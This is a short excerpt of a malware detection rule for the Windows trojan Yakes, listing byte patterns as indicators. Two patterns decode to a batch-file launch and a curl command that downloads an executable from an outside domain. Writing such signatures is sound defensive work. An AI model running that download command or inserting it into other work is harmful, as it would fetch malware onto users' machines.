...
rule Trojan_Win32_Yakes_GER_MTB{
	meta:
		description = "Trojan:Win32/Yakes.GER!MTB,SIGNATURE_TYPE_PEHSTR_EXT,07 00 07 00 07 00 00 01 00 "
	...
	strings :
		...
		$a_01_2 = {63 6d 64 20 2f 63 20 69 2e 62 61 74 } //01 00  cmd /c i.bat
		...
		$a_01_4 = {63 75 72 6c 20 2d 4c 20 2d 6f 20 64 2e 65 78 65 20 69 6c 32 64 2e 63 63 } //01 00  curl -L -o d.exe il2d.cc
